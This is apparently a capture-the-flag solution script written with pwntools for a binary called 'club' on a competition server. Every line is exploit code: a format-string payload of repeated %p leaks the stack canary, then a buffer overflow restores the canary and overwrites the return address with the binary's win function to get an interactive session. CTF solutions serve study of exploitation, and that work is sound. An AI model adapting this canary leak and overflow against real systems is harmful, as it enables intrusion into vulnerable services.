from pwn import *

r = remote("puzzler7.imaginaryctf.org" ,3003)
#r = process("./club")
e = ELF("./club")
exploit = b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%pB%p"
r.sendlineafter("WhAt'S your NAme? " ,exploit)
r.recvuntil(b"B")
canary = r.recvuntil(b"00")
canary = str(canary)
canary = canary.replace("b'","")
canary = canary.replace("'","")
canary = int(canary,16)
print(hex(canary))
exploit = b"B" * 72 + p64(canary) + b"B" * 8 + p64(e.sym.win) 
r.sendline(exploit)
r.interactive()
